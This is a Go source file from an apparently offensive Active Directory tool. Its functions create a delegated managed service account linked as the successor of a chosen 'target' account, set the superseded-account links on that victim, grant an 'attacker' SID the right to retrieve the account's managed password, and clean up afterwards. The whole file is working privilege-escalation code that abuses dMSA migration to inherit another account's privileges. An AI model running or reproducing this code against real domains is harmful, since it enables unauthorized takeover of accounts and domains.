package ldapcli

import (
	"fmt"
	"strings"

	"github.com/go-ldap/ldap/v3"
)

const (
	attrPrecededBy   = "msDS-ManagedAccountPrecededByLink"
	attrDelegState   = "msDS-DelegatedMSAState"
	attrGroupMSA     = "msDS-GroupMSAMembership"
	attrSupersedeLnk = "msDS-SupersededManagedAccountLink"
	attrSupersedeSt  = "msDS-SupersededServiceAccountState"
	dmsaClass        = "msDS-DelegatedManagedServiceAccount"
)

// DMSAObjectClasses is the structural chain live DCs expect on Add.
// msDS-DelegatedManagedServiceAccount subclasses msDS-ManagedServiceAccount → computer.
var DMSAObjectClasses = []string{
	"top",
	"person",
	"organizationalPerson",
	"user",
	"computer",
	"msDS-ManagedServiceAccount",
	dmsaClass,
}

// CreateDMSA adds a post-patch dMSA with bidirectional superseded links.
func CreateDMSA(conn *ldap.Conn, baseDN, name, ouDN, targetSAM, attackerSAM, domainDNS string) (string, error) {
	if conn == nil {
		return "", fmt.Errorf("ldap conn required")
	}
	name = strings.TrimSuffix(strings.TrimSpace(name), "$")
	if name == "" || ouDN == "" || targetSAM == "" {
		return "", fmt.Errorf("--name --ou --target required")
	}
	tgt, err := lookupSAM(conn, baseDN, targetSAM)
	if err != nil {
		return "", fmt.Errorf("dmsa --target: %w", err)
	}
	sama := name + "$"
	dn := "CN=" + name + "," + ouDN
	dns := name + "." + strings.ToLower(strings.TrimSpace(domainDNS))
	attrs := []ldap.Attribute{
		{Type: "objectClass", Vals: append([]string(nil), DMSAObjectClasses...)},
		{Type: "sAMAccountName", Vals: []string{sama}},
		{Type: "dNSHostName", Vals: []string{dns}},
		{Type: "msDS-ManagedPasswordInterval", Vals: []string{"30"}},
		{Type: attrDelegState, Vals: []string{"2"}},
		{Type: attrPrecededBy, Vals: []string{tgt.DN}},
		{Type: "msDS-SupportedEncryptionTypes", Vals: []string{"28"}},
		{Type: "userAccountControl", Vals: []string{"4096"}},
	}
	req := ldap.NewAddRequest(dn, nil)
	req.Attributes = attrs
	if err := conn.Add(req); err != nil {
		return "", fmt.Errorf("add dMSA %s: %w", dn, err)
	}
	modT := ldap.NewModifyRequest(tgt.DN, nil)
	modT.Add(attrSupersedeLnk, []string{dn})
	modT.Replace(attrSupersedeSt, []string{"2"})
	if err := conn.Modify(modT); err != nil {
		return dn, fmt.Errorf("supersede links on %s: %w", tgt.DN, err)
	}
	_ = attackerSAM
	return dn, nil
}

// EnrollDMSASelf writes msDS-GroupMSAMembership allowing the dMSA and attacker SIDs (0xf01ff).
func EnrollDMSASelf(conn *ldap.Conn, baseDN, dmsaSAM, attackerSAM string) error {
	dmsa, err := lookupSAM(conn, baseDN, dmsaSAM)
	if err != nil {
		return fmt.Errorf("dmsa: %w", err)
	}
	att, err := lookupSAM(conn, baseDN, attackerSAM)
	if err != nil {
		return fmt.Errorf("attacker: %w", err)
	}
	dSID, err := ParseSID(dmsa.GetRawAttributeValue("objectSid"))
	if err != nil {
		return err
	}
	aSID, err := ParseSID(att.GetRawAttributeValue("objectSid"))
	if err != nil {
		return err
	}
	owner, err := EncodeSID("S-1-5-18")
	if err != nil {
		return err
	}
	sd, err := BuildAllowedToActSD(owner, []string{dSID, aSID})
	if err != nil {
		return err
	}
	mod := ldap.NewModifyRequest(dmsa.DN, nil)
	mod.Replace(attrGroupMSA, []string{string(sd)})
	if err := conn.Modify(mod); err != nil {
		return fmt.Errorf("msDS-GroupMSAMembership: %w", err)
	}
	return nil
}

// DeleteDMSA removes the dMSA and clears this object's superseded link on the victim.
func DeleteDMSA(conn *ldap.Conn, baseDN, sam string) error {
	e, err := lookupSAM(conn, baseDN, sam)
	if err != nil {
		return err
	}
	full, err := searchDN(conn, e.DN, []string{attrPrecededBy, "distinguishedName"})
	if err != nil {
		return fmt.Errorf("read dMSA %s: %w", e.DN, err)
	}
	if victim := full.GetAttributeValue(attrPrecededBy); victim != "" {
		if err := clearSupersedeLink(conn, victim, e.DN); err != nil {
			return fmt.Errorf("unwind superseded link on %s: %w (dMSA not deleted)", victim, err)
		}
	}
	return conn.Del(ldap.NewDelRequest(e.DN, nil))
}

func searchDN(conn *ldap.Conn, dn string, attrs []string) (*ldap.Entry, error) {
	if conn == nil {
		return nil, fmt.Errorf("ldap conn required")
	}
	req := ldap.NewSearchRequest(
		dn,
		ldap.ScopeBaseObject,
		ldap.NeverDerefAliases,
		1, 10, false,
		"(objectClass=*)",
		attrs,
		nil,
	)
	sr, err := conn.Search(req)
	if err != nil {
		return nil, err
	}
	if len(sr.Entries) == 0 {
		return nil, fmt.Errorf("object %q not found", dn)
	}
	return sr.Entries[0], nil
}

func clearSupersedeLink(conn *ldap.Conn, victimDN, dmsaDN string) error {
	v, err := searchDN(conn, victimDN, []string{attrSupersedeLnk, attrSupersedeSt, "distinguishedName"})
	if err != nil {
		return err
	}
	remaining := remainingSupersedeLinks(v.GetAttributeValues(attrSupersedeLnk), dmsaDN)
	mod := ldap.NewModifyRequest(v.DN, nil)
	mod.Replace(attrSupersedeLnk, remaining)
	if len(remaining) == 0 {
		mod.Replace(attrSupersedeSt, []string{"0"})
	}
	return conn.Modify(mod)
}

func remainingSupersedeLinks(links []string, dmsaDN string) []string {
	out := make([]string, 0, len(links))
	for _, l := range links {
		if !strings.EqualFold(strings.TrimSpace(l), strings.TrimSpace(dmsaDN)) {
			out = append(out, l)
		}
	}
	return out
}
